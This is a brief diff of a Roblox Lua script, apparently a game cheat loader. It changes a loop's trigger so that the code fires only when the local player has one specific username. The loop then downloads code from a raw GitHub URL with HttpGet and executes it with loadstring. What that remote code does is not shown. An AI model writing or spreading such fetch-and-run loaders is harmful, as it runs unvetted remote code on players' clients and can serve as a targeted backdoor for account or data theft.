@@ -1,6 +1,6 @@
 spawn(function()
     while true do
-if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
+if game:GetService("Players").LocalPlayer.Name == "Night_19372" then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/hub5144/1/main/3'))()
     
                         local HttpService = game:GetService("HttpService")
